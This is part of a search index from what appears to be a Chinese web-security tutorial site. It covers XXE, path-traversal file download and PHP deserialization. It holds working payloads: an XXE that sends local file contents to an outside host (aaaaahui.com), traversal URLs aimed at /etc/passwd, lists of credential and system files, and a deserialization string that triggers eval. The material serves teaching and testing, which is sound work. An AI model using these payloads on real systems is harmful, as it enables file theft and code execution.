<p>\u53ef\u4ee5\u770b\u5230\u4e0e\u8bfbsystem.ini\u4e0d\u540c\uff0c\u8fd9\u91cc\u62a5\u9519\u4e86\uff0c\u60f3\u77e5\u9053\u539f\u56e0\u9700\u8981\u4e86\u89e3CDATA\u548cPCDATA</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#pcdata","title":"PCDATA","text":"<p>PCDATA \u6307\u7684\u662f\u88ab\u89e3\u6790\u7684\u5b57\u7b26\u6570\u636e\uff08Parsed Character Data\uff09\u3002</p> <p>XML \u89e3\u6790\u5668\u901a\u5e38\u4f1a\u89e3\u6790 XML \u6587\u6863\u4e2d\u6240\u6709\u7684\u6587\u672c\u3002</p> <p>\u5f53\u67d0\u4e2a XML \u5143\u7d20\u88ab\u89e3\u6790\u65f6\uff0c\u5176\u6807\u7b7e\u4e4b\u95f4\u7684\u6587\u672c\u4e5f\u4f1a\u88ab\u89e3\u6790\uff1a</p> <pre><code>&lt;message&gt;\u6b64\u6587\u672c\u4e5f\u4f1a\u88ab\u89e3\u6790&lt;/message&gt;\n</code></pre> <p>\u89e3\u6790\u5668\u4e4b\u6240\u4ee5\u8fd9\u4e48\u505a\u662f\u56e0\u4e3a XML \u5143\u7d20\u53ef\u5305\u542b\u5176\u4ed6\u5143\u7d20\uff0c\u5c31\u50cf\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5176\u4e2d\u7684 \u5143\u7d20\u5305\u542b\u7740\u53e6\u5916\u7684\u4e24\u4e2a\u5143\u7d20(first \u548c last)\uff1a <pre><code>&lt;name&gt;&lt;first&gt;Bill&lt;/first&gt;&lt;last&gt;Gates&lt;/last&gt;&lt;/name&gt;\n</code></pre> <p>\u800c\u89e3\u6790\u5668\u4f1a\u628a\u5b83\u5206\u89e3\u4e3a\u50cf\u8fd9\u6837\u7684\u5b50\u5143\u7d20\uff1a</p> <pre><code>&lt;name&gt;\n&lt;first&gt;Bill&lt;/first&gt;\n&lt;last&gt;Gates&lt;/last&gt;\n&lt;/name&gt;\n</code></pre>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#cdata","title":"CDATA","text":"<p>\u672f\u8bed CDATA \u6307\u7684\u662f\u4e0d\u5e94\u7531 XML \u89e3\u6790\u5668\u8fdb\u884c\u89e3\u6790\u7684\u6587\u672c\u6570\u636e\uff08Unparsed Character Data\uff09\u3002</p> <p>\u5728 XML \u5143\u7d20\u4e2d\uff0c\"&lt;\" \u548c \"&amp;\" \u662f\u975e\u6cd5\u7684\u3002</p> <p>\"&lt;\" \u4f1a\u4ea7\u751f\u9519\u8bef\uff0c\u56e0\u4e3a\u89e3\u6790\u5668\u4f1a\u628a\u8be5\u5b57\u7b26\u89e3\u91ca\u4e3a\u65b0\u5143\u7d20\u7684\u5f00\u59cb\u3002</p> <p>\"&amp;\" \u4e5f\u4f1a\u4ea7\u751f\u9519\u8bef\uff0c\u56e0\u4e3a\u89e3\u6790\u5668\u4f1a\u628a\u8be5\u5b57\u7b26\u89e3\u91ca\u4e3a\u5b57\u7b26\u5b9e\u4f53\u7684\u5f00\u59cb\u3002</p> <p>\u67d0\u4e9b\u6587\u672c\uff0c\u6bd4\u5982 JavaScript \u4ee3\u7801\uff0c\u5305\u542b\u5927\u91cf \"&lt;\" \u6216 \"&amp;\" \u5b57\u7b26\u3002\u4e3a\u4e86\u907f\u514d\u9519\u8bef\uff0c\u53ef\u4ee5\u5c06\u811a\u672c\u4ee3\u7801\u5b9a\u4e49\u4e3a CDATA\u3002</p> <p>CDATA \u90e8\u5206\u4e2d\u7684\u6240\u6709\u5185\u5bb9\u90fd\u4f1a\u88ab\u89e3\u6790\u5668\u5ffd\u7565\u3002</p> <p>CDATA \u90e8\u5206\u7531 \"&lt;![CDATA[\" \u5f00\u59cb\uff0c\u7531 \"]]&gt;\" \u7ed3\u675f\uff1a</p> <pre><code>&lt;script&gt;\n&lt;![CDATA[\nfunction matchwo(a,b)\n{\nif (a &lt; b &amp;&amp; a &lt; 0) then\n{\nreturn 1;\n}\nelse\n{\nreturn 0;\n}\n}\n]]&gt;\n&lt;/script&gt;\n</code></pre> <p>\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u89e3\u6790\u5668\u4f1a\u5ffd\u7565 CDATA \u90e8\u5206\u4e2d\u7684\u6240\u6709\u5185\u5bb9\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#cdata_1","title":"\u5173\u4e8e CDATA \u90e8\u5206\u7684\u6ce8\u91ca\uff1a","text":"<p>CDATA \u90e8\u5206\u4e0d\u80fd\u5305\u542b\u5b57\u7b26\u4e32 \"]]&gt;\"\u3002\u4e5f\u4e0d\u5141\u8bb8\u5d4c\u5957\u7684 CDATA \u90e8\u5206\u3002</p> <p>\u6807\u8bb0 CDATA \u90e8\u5206\u7ed3\u5c3e\u7684 \"]]&gt;\" \u4e0d\u80fd\u5305\u542b\u7a7a\u683c\u6216\u6298\u884c\u3002</p> <p>\u6211\u4eec\u7684\u601d\u8def\u5c31\u662f\u628a\u8bfb\u53d6\u7684\u6587\u4ef6\u653e\u5728CDATA\u4e2d\u4e4b\u540e\u518d\u8c03\u7528\uff0c\u90a3\u4e48\u6784\u9020\u4e00\u4e2aPOC\u5982\u4e0b</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;!DOCTYPE roottag\n[&lt;!ENTITY start\n\"&lt;![CDATA[&lt;!ENTITY % xxe SYSTEM \"file:///c:/test.txt\"&gt; ]]&gt;\"\n&gt;]\n% xxe;&gt;\n&lt;roottag&gt;&amp;start&lt;/roottag&gt;\n</code></pre> <p>\u4f46\u662f\u8fd8\u662f\u8bfb\u4e0d\u51fa\u6765\uff0c\u5982\u4e0b\u56fe\uff1a</p> <p>\u76f4\u63a5\u653e\u6b63\u786e\u7684payload\uff0c\u7136\u540e\u518d\u8bb2\u89e3\u539f\u56e0</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;!DOCTYPE root [\n&lt;!ENTITY % start \"&lt;![CDATA[\"&gt;\n&lt;!ENTITY % go SYSTEM \"file:///c:/test.txt\"&gt;\n&lt;!ENTITY % end \"]]&gt;\"&gt;\n&lt;!ENTITY % dtd SYSTEM \"http://aaaaahui.com/evil.dtd\"&gt; %dtd;\n]&gt; \n&lt;root&gt;&amp;all;&lt;/root&gt;\n</code></pre> <p>http://aaaaahui.com/evil.dtd</p> <pre><code>&lt;!ENTITY all \"%start;%go;%end;\"&gt;\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2apayload\u662f\u53ef\u4ee5\u6210\u529f\u8bfb\u53d6\u6587\u4ef6\u7684\uff0c\u5bf9\u6bd4\u4e24\u4e2apayload</p> <p></p> <p></p> <p>\u4e24\u4e2apayload\u7684\u903b\u8f91\u90fd\u662f\u4e00\u6837\u7684\uff0c\u4e0d\u8fc7\u7b2c\u4e8c\u4e2a\u662f\u8c03\u7528\u7684\u5916\u90e8\u7684dtd\u6587\u6863\u5c31\u53ef\u4ee5\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728xml\u4e2d\uff0cxml \u89e3\u6790\u5668\u6709\u4e2a\u9650\u5236\uff1a\u4e0d\u80fd\u5728\u5185\u90e8 Entity \u4e2d\u5f15\u7528\uff0c\u201cPEReferences forbidden in internal subset in  Entity \u201d\u6307\u7684\u5c31\u662f\u7981\u6b62\u5185\u90e8\u53c2\u6570\u5b9e\u4f53\u5f15\u7528\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/#xxe_1","title":"\u65e0\u56de\u663exxe\u6f0f\u6d1e\u5229\u7528","text":"<p>\u73b0\u5728\u5f88\u591axxe\u6f0f\u6d1e\u90fd\u662f\u6ca1\u6709\u56de\u663e\u7684\uff0c\u4e0b\u9762\u662f\u518d\u6ca1\u6709\u56de\u663e\u7684\u65f6\u5019\u53ef\u4ee5\u7684\u5229\u7528\u65b9\u5f0f\u3002</p> <p>\u601d\u8def\u5c31\u662f\u5728\u6ca1\u6709\u56de\u663e\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c06\u8bfb\u53d6\u7684\u6587\u4ef6\u5e26\u51fa\u6765\uff0c\u4e3e\u4e00\u4e2a\u4f8b\u5b50\u5c31\u662f\uff0c\u6211\u4eec\u5982\u679c\u5c06/etc/passwd\u6587\u4ef6\u8d4b\u7ed9\u5b9e\u4f53test\uff0c\u90a3\u4e48\u6211\u4eec\u5728\u8bbf\u95eehttp://www.aaaaahui.com/?%test\u65f6\uff0c\u6211\u4eec\u670d\u52a1\u5668\u4e0a\u7684\u65e5\u5fd7\u6587\u4ef6\u5c31\u4f1a\u4fdd\u5b58/etc/passwd\u7684\u6587\u4ef6\u5185\u5bb9\uff0c\u4e0b\u9762\u8fdb\u884c\u5b9e\u9a8c\uff1a</p> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE message [    \n&lt;!ENTITY % remote SYSTEM \"http://aaaaahui.com/xml.dtd\"&gt;\n&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///c:/test.txt\"&gt;\n%remote;\n%send;\n]&gt;\n&lt;message&gt;1234&lt;/message&gt;\n</code></pre> <p>xml.dtd</p> <pre><code>&lt;!ENTITY % start \"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://aaaaahui.com/?%file;'&gt;\"&gt;%start\n</code></pre> <p>%\u662f%\u7684html\u5b9e\u4f53\u7f16\u7801\uff0c\u56e0\u4e3a\u5728xml.dtd\u7684\u5b9e\u4f53\u4e2d\u4e0d\u80fd\u6709%</p> <p>\u5b9e\u9a8c\u5982\u4e0b\u56fe</p> <p></p> <p>\u67e5\u770b\u65e5\u5fd7\u6587\u4ef6</p> <p></p> <p>\u8fd9\u91cc\u6211\u4eec\u8bfb\u53d6\u7684\u6587\u4ef6\u5df2\u7ecf\u5e26\u51fa\u6765\u4e86\uff0c\u90a3\u4e48\u539f\u7406\u5c31\u662f\u5c06\u6587\u4ef6\u8d4b\u7ed9\u5b9e\u4f53\u540e\u5e26\u7740\u8bbf\u95ee\u6211\u4eec\u7684vps\u7136\u540e\u5728\u65e5\u5fd7\u6587\u4ef6\u4e2d\u5c31\u80fd\u770b\u5230\u6211\u4eec\u8bfb\u53d6\u7684\u6587\u4ef6\u4e86\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/","title":"\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e","text":""},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#_2","title":"\u7b80\u4ecb\uff1a","text":"<p>\u5f88\u591a\u7f51\u7ad9\u7531\u4e8e\u4e1a\u52a1\u9700\u6c42\uff0c\u4f1a\u7ed9\u7528\u6237\u63d0\u4f9b\u4e00\u4e9b\u6587\u4ef6\u4e0b\u8f7d\u7684\u5730\u65b9\uff0c\u4f8b\u5982\u4e00\u4e9b\u9644\u4ef6\u4e0b\u8f7d\u7684\u5730\u65b9\uff0c\u5982\u679c\u6b64\u65f6\u6587\u4ef6\u4e0b\u8f7d\u662f\u901a\u8fc7\u8def\u5f84\u7684\u65b9\u5f0f\u63d0\u4f9b\u4e0b\u8f7d\uff0c\u5e76\u4e14\u8def\u5f84\u53c2\u6570\u662f\u524d\u7aef\u63d0\u4ea4\u6570\u636e\u5305\u5230\u540e\u7aef\u7684\uff0c\u90a3\u4e48\u6076\u610f\u7528\u6237\u5c31\u53ef\u4ee5\u4fee\u6539\u8def\u5f84\u4ece\u800c\u4e0b\u8f7d\u670d\u52a1\u5668\u7684\u4e00\u4e9b\u654f\u611f\u6587\u4ef6\u6216\u8005\u7f51\u7ad9\u6e90\u7801\u7b49\uff0c\u5bf9\u670d\u52a1\u5668\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u653b\u51fb</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#_3","title":"\u6f0f\u6d1e\u539f\u7406\u5b9e\u4f8b\uff1a","text":"<p>\u67d0\u7f51\u7ad9\u9644\u4ef6\u4e0b\u8f7d\u5904\u5b58\u5728\u5982\u4e0b\u94fe\u63a5\uff1a</p> <pre><code>http://example.com/download.php?file=/uploadfile/test.pdf\n</code></pre> <p>\u5982\u679c\u8fd9\u91cc\u6ca1\u6709\u5bf9file\u53c2\u6570\u505a\u4e25\u683c\u7684\u8fc7\u6ee4\uff0c\u5e76\u4e14\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u9650\u5236\u6587\u4ef6\u7684\u8bbf\u95ee\u8303\u56f4\uff0c\u90a3\u4e48\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539file\u53c2\u6570\u5185\u5bb9\uff0c\u56de\u6eaf\u4e0a\u7ea7\u76ee\u5f55\u4e0b\u8f7d\u670d\u52a1\u5668\u7684\u654f\u611f\u6587\u4ef6\u6216\u6e90\u7801\uff0c\u4f8b\u5982\u7528\u6237\u63d0\u4ea4\u5982\u4e0b\u94fe\u63a5</p> <pre><code>http://example.com/download.php?file=/uploadfile/../../../../../etc/passwd\n</code></pre> <p>\u90a3\u4e48\u5c31\u53ef\u4ee5\u4e0b\u8f7d\u670d\u52a1\u5668\u4e2d\u7684/etc/passwd\u6587\u4ef6</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#_4","title":"\u6f0f\u6d1e\u68c0\u6d4b\uff1a","text":"<p>\u627e\u5230\u4e0b\u8f7d\u6587\u4ef6\u65f6\u901a\u8fc7\u8def\u5f84\u63d0\u4ea4\u6587\u4ef6\u53c2\u6570\u7684\u5730\u65b9\uff0c\u901a\u8fc7<code>../</code>\u56de\u6eaf\u4e0a\u7ea7\u76ee\u5f55\uff0c\u53ef\u4ee5\u4e0b\u8f7d\u5230\u4e00\u4e9b\u654f\u611f\u6587\u4ef6\u6216\u8005\u7cfb\u7edf\u6587\u4ef6\uff0c\u90a3\u4e48\u5c31\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#_5","title":"\u6f0f\u6d1e\u5229\u7528\uff1a","text":"<p>\u4e0b\u8f7d\u6e90\u7801\u8fdb\u884c\u4ee3\u7801\u5ba1\u8ba1\uff0c\u5bfb\u627e\u7f51\u7ad9\u7684\u66f4\u591a\u6f0f\u6d1e\uff0c\u5bf9\u7f51\u7ad9\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u653b\u51fb</p> <p>\u4e0b\u8f7d\u7f51\u7ad9\u914d\u7f6e\u6587\u4ef6\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u8fde\u63a5\u6587\u4ef6\uff0c\u83b7\u53d6\u6570\u636e\u5e93\u8d26\u5bc6\u8fdb\u884c\u8fdc\u7a0b\u8fde\u63a5</p> <p>\u4e0b\u8f7d\u7cfb\u7edf\u6587\u4ef6\uff0c\u7ed9\u51fa\u4e00\u4e9b\u5e38\u7528\u7684\u7cfb\u7edf\u654f\u611f\u6587\u4ef6</p> <pre><code>Unix/liux\u7cfb\u7edf\n/etc/passwd \u5b58\u50a8\u64cd\u4f5c\u7cfb\u7edf\u7528\u6237\u4fe1\u606f,\u8be5\u6587\u4ef6\u4e3a\u6240\u6709\u7528\u6237\u53ef\u89c1\n/etc/shadow \u5b58\u50a8\u7528\u6237\u767b\u5f55\u540d\u5bc6\u7801\u7b49\u4fe1\u606f\n/etc/group \u5b58\u50a8\u6709\u5173\u672c\u5730\u7528\u6237\u7ec4\u7684\u4fe1\u606f\n/usr/local/resin-3.0.22/conf/resin.conf 3.0.22\u7684RESIN\u914d\u7f6e\u6587\u4ef6\n/usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE\u865a\u62df\u4e3b\u673a\n/etc/httpd/conf/httpd.conf\u6216/usr/local/apche/conf /httpd.conf linux APACHE\u865a\u62df\u4e3b\u673a\u914d\u7f6e\u6587\u4ef6\n/usr/local/resin-3.0.22/conf/resin.conf 3.0.22\u7684RESIN\u914d\u7f6e\u6587\u4ef6\n/usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE\u865a\u62df\u4e3b\u673a\n/etc/sysconfig/iptables \u67e5\u770b\u9632\u706b\u5899\u7b56\u7565\n/root/.mysql_history\u3001/root/.bash_history Mysql\u8d26\u53f7\u5bc6\u7801\u4fe1\u606f\n\nWindows\u7cfb\u7edf\nC:\\boot.ini \u67e5\u770b\u7cfb\u7edf\u7248\u672c\nC:\\windows\\system32\\inetsrv\\MetaBase.xml IIS\u914d\u7f6e\u6587\u4ef6\nC:\\windows\\repair\\sam \u5b58\u50a8Windows\u7cfb\u7edf\u521d\u59cb\u5b89\u88c5\u5bc6\u7801\nC:\\\\Program files\\mysql\\my.ini mysql\u914d\u7f6e\nC:\\\\Program Filed\\mysql\\data\\mysql\\user.MYD Mysql root\nC:\\\\windows\\php.ini php\u914d\u7f6e\u4fe1\u606f\nC:\\\\windows\\my.ini Mysql\u914d\u7f6e\u6587\u4ef6\n</code></pre>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#_6","title":"\u5e38\u89c1\u573a\u666f\uff1a","text":"<p>\u6587\u4ef6\u4e0b\u8f7d\u5904</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#_7","title":"\u6f0f\u6d1e\u9632\u5fa1\uff1a","text":"<p>\u8fc7\u6ee4\u6587\u4ef6\u4e0b\u8f7d\u53c2\u6570\u4e2d\u7684\".\"\u548c\"/\"\u4ee5\u9632\u6b62\u56de\u6eaf\u4e0a\u7ea7\u76ee\u5f55</p> <p>php.ini\u914d\u7f6eopen_basedir\u9650\u5b9a\u6587\u4ef6\u8bbf\u95ee\u8303\u56f4</p> <p>\u4e0d\u4f7f\u7528\u8def\u5f84\u65b9\u5f0f\u63d0\u4f9b\u4e0b\u8f7d</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","title":"\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u8be6\u89e3\u2014\u2014\u57fa\u7840\u7bc7","text":""},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_2","title":"\u7b80\u4ecb\uff1a","text":"<p>\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u662f\u57fa\u4e8e\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u7684\u64cd\u4f5c\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u2014\u2014unserialize()\u65f6\u5b58\u5728\u7528\u6237\u53ef\u63a7\u53c2\u6570\uff0c\u800c\u53cd\u5e8f\u5217\u5316\u4f1a\u81ea\u52a8\u8c03\u7528\u4e00\u4e9b\u9b54\u672f\u65b9\u6cd5\uff0c\u5982\u679c\u9b54\u672f\u65b9\u6cd5\u5185\u5b58\u5728\u4e00\u4e9b\u654f\u611f\u64cd\u4f5c\u4f8b\u5982eval()\u51fd\u6570\uff0c\u800c\u4e14\u53c2\u6570\u662f\u901a\u8fc7\u53cd\u5e8f\u5217\u5316\u4ea7\u751f\u7684\uff0c\u90a3\u4e48\u7528\u6237\u5c31\u53ef\u4ee5\u901a\u8fc7\u6539\u53d8\u53c2\u6570\u6765\u6267\u884c\u654f\u611f\u64cd\u4f5c\uff0c\u8fd9\u5c31\u662f\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002</p> <p>\u53ef\u80fd\u770b\u4e86\u4ee5\u4e0a\u4f60\u8fd8\u662f\u5bf9\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u4e0d\u592a\u7406\u89e3\uff0c\u90a3\u4e48\u6211\u4eec\u901a\u8fc7\u5b66\u4e60\u4ee5\u4e0b\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u7684\u57fa\u7840\u77e5\u8bc6\uff0c\u76f8\u4fe1\u4f60\u4f1a\u5bf9\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u6709\u4e00\u4e2a\u65b0\u7684\u8ba4\u8bc6\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_3","title":"\u57fa\u7840\u77e5\u8bc6\uff1a","text":""},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_4","title":"\u4ec0\u4e48\u662f\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316","text":"<p>\u5e8f\u5217\u5316\u662f\u5c06\u5bf9\u8c61\u7684\u72b6\u6001\u4fe1\u606f\u8f6c\u6362\u4e3a\u53ef\u4ee5\u5b58\u50a8\u6216\u4f20\u8f93\u7684\u5f62\u5f0f\u7684\u8fc7\u7a0b\uff0c\u5728\u5e8f\u5217\u5316\u671f\u95f4\uff0c\u5bf9\u8c61\u5c06\u5f53\u524d\u72b6\u6001\u5199\u5165\u5230\u4e34\u65f6\u6216\u6301\u4e45\u6027\u5b58\u50a8\u533a\u3002\u4ee5\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ece\u5b58\u50a8\u533a\u4e2d\u8bfb\u53d6\u6216\u53cd\u5e8f\u5217\u5316\u5bf9\u8c61\u72b6\u6001\uff0c\u91cd\u65b0\u521b\u5efa\u8be5\u5bf9\u8c61\u3002</p> <p>\u7b80\u5355\u7684\u6765\u8bb2\uff1a</p> <p>\u5e8f\u5217\u5316\uff1a\u628a\u5bf9\u8c61\u8f6c\u6362\u4e3a\u5b57\u8282\u5e8f\u5217\u7684\u8fc7\u7a0b\u79f0\u4e3a\u5bf9\u8c61\u7684\u5e8f\u5217\u5316\u3002 \u53cd\u5e8f\u5217\u5316\uff1a\u628a\u5b57\u8282\u5e8f\u5217\u6062\u590d\u4e3a\u5bf9\u8c61\u7684\u8fc7\u7a0b\u79f0\u4e3a\u5bf9\u8c61\u7684\u53cd\u5e8f\u5217\u5316\u3002</p> <p>PHP\u4e2d\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u7684\u51fd\u6570\uff1a</p> <p></p> <p></p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_5","title":"\u4ec0\u4e48\u662f\u9b54\u672f\u65b9\u6cd5","text":"<p>\u9b54\u672f\u65b9\u6cd5\u662f\u8bed\u8a00\u4e2d\u4fdd\u7559\u7684\u65b9\u6cd5\u540d\uff0c\u5404\u4e2a\u65b9\u6cd5\u4f1a\u5728\u5bf9\u5e94\u64cd\u4f5c\u65f6\u81ea\u52a8\u8c03\u7528\uff0c\u4e0b\u9762\u4ee5PHP\u8bed\u8a00\u4e2d\u7684\u9b54\u672f\u65b9\u6cd5\u6765\u505a\u8bb2\u89e3</p> <pre><code>__construct() \u5f53\u521b\u5efa\u5bf9\u8c61\u65f6\u89e6\u53d1\uff0c\u4e00\u822c\u7528\u4e8e\u521d\u59cb\u5316\u5bf9\u8c61\uff0c\u5bf9\u53d8\u91cf\u8d4b\u521d\u503c\n__sleep() \u4f7f\u7528serialize()\u65f6\u81ea\u52a8\u89e6\u53d1 \n__wakeup() \u4f7f\u7528unserialize()\u65f6\u81ea\u52a8\u89e6\u53d1\n__destruct() \u5f53\u4e00\u4e2a\u5bf9\u8c61\u88ab\u9500\u6bc1\u65f6\u89e6\u53d1\n__toString() \u5f53\u4e00\u4e2a\u7c7b\u88ab\u5f53\u6210\u5b57\u7b26\u4e32\u4f7f\u7528\u65f6\u89e6\u53d1\n__invoke() \u5f53\u5c1d\u8bd5\u4ee5\u8c03\u7528\u51fd\u6570\u7684\u65b9\u5f0f\u8c03\u7528\u4e00\u4e2a\u5bf9\u8c61\u65f6\u89e6\u53d1\n__call() \u5728\u5bf9\u8c61\u4e0a\u4e0b\u6587\u4e2d\u8c03\u7528\u4e0d\u53ef\u8bbf\u95ee\u7684\u65b9\u6cd5\u65f6\u89e6\u53d1 \n__callStatic() \u5728\u9759\u6001\u4e0a\u4e0b\u6587\u4e2d\u8c03\u7528\u4e0d\u53ef\u8bbf\u95ee\u7684\u65b9\u6cd5\u65f6\u89e6\u53d1 \n__get() \u7528\u4e8e\u4ece\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\u8bfb\u53d6\u6570\u636e\n__set() \u7528\u4e8e\u5c06\u6570\u636e\u5199\u5165\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\n__isset() \u5728\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\u4e0a\u8c03\u7528isset()\u6216empty()\u89e6\u53d1\n__unset() \u5728\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\u4e0a\u4f7f\u7528unset()\u65f6\u89e6\u53d1\n</code></pre> <p>\u8fd8\u4e0d\u660e\u767d\u7684\u8bdd\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u5e8f\u5217\u5316\u7684\u5b9e\u4f8b</p> <pre><code>&lt;?php\n\nclass test{\n    public $id = 'Baize';\n    public $name = 'Sec';\n}\n\n$test1 = new test();\n\n$test2 = serialize($test1);\n\nprint_r($test2);\n\n?&gt;\n</code></pre> <p>\u4ee5\u4e0a\u662f\u5bf9test\u7c7b\u5e8f\u5217\u5316\u540e\u8f93\u51fa\u7684\u4f8b\u5b50\uff0c\u6548\u679c\u56fe\u5982\u4e0b</p> <p></p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_6","title":"\u6f0f\u6d1e\u539f\u7406\u5b9e\u4f8b\uff1a","text":"<p>\u5728\u53cd\u5e8f\u5217\u5316\u65f6\uff0c\u53c2\u6570\u7528\u6237\u53ef\u63a7\uff0c\u9b54\u672f\u65b9\u6cd5\u4e2d\u5b58\u5728\u5371\u5bb3\u51fd\u6570\uff0c\u5c31\u4f1a\u4ea7\u751f\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u6700\u7b80\u5355\u7684\u5b9e\u4f8b</p> <pre><code>&lt;?php   \n\nclass test{\n\n    var $id = 'Baize';\n\n    function __wakeup(){\n        eval($this-&gt;id);\n    }\n\n}\n\n$test1 = $_GET['string'];\n\n$test2 = unserialize($test1);\n\n?&gt;\n</code></pre> <p>\u5ba1\u8ba1\u4ee3\u7801\uff0c\u603b\u7ed3\u5982\u4e0b</p> <p>1.\u53ef\u63a7\u53c2\u6570\u662fGET\u578bstring\u53c2\u6570</p> <p>2.\u540e\u7aef\u63a5\u6536\u53c2\u6570\u540e\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c</p> <p>3.test\u7c7b\u4e2d\u5b58\u5728__wakeup\u9b54\u672f\u65b9\u6cd5\uff0c\u64cd\u4f5c\u662feval($id)</p> <p>\u90a3\u4e48\u6211\u4eec\u601d\u8def\u662f\uff1a\u6784\u9020test\u7c7b\u7684\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\uff0c\u4f7f\u5f97\u53cd\u5e8f\u5217\u5316\u540e\u5f97$id\u503c\u4e3a\u8981\u6267\u884c\u7684\u64cd\u4f5c\uff0c\u4f8b\u5982\u6211\u4eec\u8981\u6267\u884cphpinfo()\uff0c\u90a3\u4e48\u53ef\u4ee5\u6784\u9020\u8fd9\u6837\u4e00\u4e2a\u5b57\u7b26\u4e32</p> <pre><code>O:4:\"test\":1:{s:2:\"id\";s:10:\"phpinfo();\"}\n</code></pre> <p>\u5728\u53cd\u5e8f\u5217\u5316\u540e\u4f1a\u91cd\u65b0\u521b\u5efa\u8be5\u5bf9\u8c61test\uff0c\u5e76\u4e14id\u53c2\u6570\u4f1a\u6062\u590d\u4e3a\u6211\u4eec\u63d0\u4ea4\u7684\u5e8f\u5217\u5316\u53c2\u6570\u4e2d\u8bbe\u5b9a\u7684\u503c\uff0c\u5373phpinfo(); 